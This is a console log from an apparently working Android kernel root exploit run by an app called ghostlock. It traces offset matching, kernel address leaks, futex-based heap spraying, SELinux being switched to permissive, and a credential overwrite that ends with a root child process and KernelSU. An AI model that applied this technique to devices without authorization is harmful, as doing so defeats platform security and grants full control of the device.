[33m[*] [0mcpu pair: main=3 consumer=4
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mno external offsets match at /data/user/0/com.ghostlock.app/files/offsets.json
[32m[+] [0moffsets matched: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[32m[+] [0mstartup context pid=14733 uid=10506 euid=10506 gid=10506 egid=10506 attr=u:r:runas_app:s0:c250,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=14733 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=14733 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=14733 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=3
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+0ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+169ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +209ms
[33m[*] [0m[spray] finding futex collisions... +415ms
[33m[*] [0m[spray]   still finding collisions (2s) 33% (futex 0xad5eaf0/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (4s) 67% (futex 0x15bfcfe0/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (6s) 99% (futex 0x1ffffff8/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +6682ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89f7859800 +11931ms
[33m[*] [0m[spray] payload ready +11933ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +12037ms
[33m[*] [0m[T+12206ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=4
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+14212ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff89f7858108 mode=1 leaf=1
[33m[*] [0m[T+14314ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +231ms
[33m[*] [0m[spray] finding futex collisions... +438ms
[33m[*] [0m[spray]   still finding collisions (2s) 33% (futex 0xab62b10/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (4s) 67% (futex 0x15aba5d0/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (6s) 99% (futex 0x1ffffff8/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +6755ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff892c728800 +7727ms
[33m[*] [0m[spray] payload ready +7729ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +7861ms
[33m[*] [0m[T+22175ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=4
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+24180ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+24180ms] Write 1 complete
[33m[*] [0m[T+24381ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff804233da00 (170/256 votes)
[33m[*] [0mperf task: 0xffffff804233da00 (154/256 votes)
[33m[*] [0m[T+41487ms] perf_find_task done
[33m[*] [0mchild_pid=20301 child_task=0xffffff804233da00
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +219ms
[33m[*] [0m[spray] finding futex collisions... +424ms
[33m[*] [0m[spray]   still finding collisions (2s) 33% (futex 0xad399c8/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (4s) 68% (futex 0x15d6eb70/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (6s) 99% (futex 0x1ffffff8/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +6695ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff890f278400 +7080ms
[33m[*] [0m[spray] payload ready +7082ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +7211ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff804233e198 mode=2 leaf=0
[33m[*] [0m[T+48889ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +224ms
[33m[*] [0m[spray] finding futex collisions... +432ms
[33m[*] [0m[spray]   still finding collisions (2s) 33% (futex 0xabd8ec0/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (4s) 67% (futex 0x15a7d3e8/0x1000000000)...
[33m[*] [0m[spray]   still finding collisions (6s) 99% (futex 0x1ffffff8/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +6749ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8a5a52b000 +14889ms
[33m[*] [0m[spray] payload ready +14892ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +15027ms
[33m[*] [0m[T+63917ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=4
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+65922ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=4
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[32m[+] [0mno app seccomp filter (adb/shell flow); skipping W3
[33m[*] [0m[T+67051ms] exploit complete
[32m[+] [0mKernelSU ready
